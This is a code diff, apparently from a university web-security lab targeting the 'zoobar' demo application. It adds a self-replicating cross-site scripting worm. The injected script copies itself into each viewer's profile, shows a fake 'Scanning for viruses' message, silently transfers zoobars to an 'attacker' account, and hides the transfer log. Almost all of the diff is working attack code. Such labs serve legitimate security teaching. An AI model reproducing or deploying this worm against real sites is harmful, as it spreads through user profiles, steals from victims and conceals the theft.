@@ -2,11 +2,15 @@
 <script>
 document.addEventListener("DOMContentLoaded", theDomHasLoaded, false);
 function theDomHasLoaded(e) { 
+var content = "<h3>Scanning for viruses...</h3>" + '<script>' +'document.addEventListener("DOMContentLoaded", theDomHasLoaded, false); function theDomHasLoaded(e) { var profile = new XMLHttpRequest(); profile.open(' + "'POST'" + ',' + "'/zoobar/index.cgi/'" + ', true); profile.setRequestHeader(' + '"Content-type"' + ',' + '"application/x-www-form-urlencoded"' + ');' + 'profile.send(' + "'profile_update=" + encodeURIComponent(content) + "&profile_submit=Save'" + ');' + 'var steal = new XMLHttpRequest(); steal.open(' + "'POST'" + ',' + "'/zoobar/index.cgi/transfer'" + ', true); steal.setRequestHeader(' + '"Content-type"' + ',' + '"application/x-www-form-urlencoded"' + ');' + 'steal.send(' +"'zoobars=1&recipient=attacker&submission=Send'" + ');' + 'document.getElementsByClassName("log")[0].style.visibility = ' + "'hidden';}" + '</scr'+'ipt>' + '<span id="zoobars" class="10"></span>';
+var profile = new XMLHttpRequest();
+profile.open('POST', 'http://localhost:8080/zoobar/index.cgi/', true);
+profile.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+profile.send('profile_update='+encodeURIComponent(content)+'&profile_submit=Save');
 var steal = new XMLHttpRequest();
-var params = ('zoobars=1&recipient=admin&submission=Send');
 steal.open('POST', 'http://localhost:8080/zoobar/index.cgi/transfer', true);
 steal.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
-steal.send(params);
+steal.send('zoobars=1&recipient=attacker&submission=Send');
 document.getElementsByClassName("log")[0].style.visibility = 'hidden'; //hide the zoobar transfer log data
 } 
 </script>
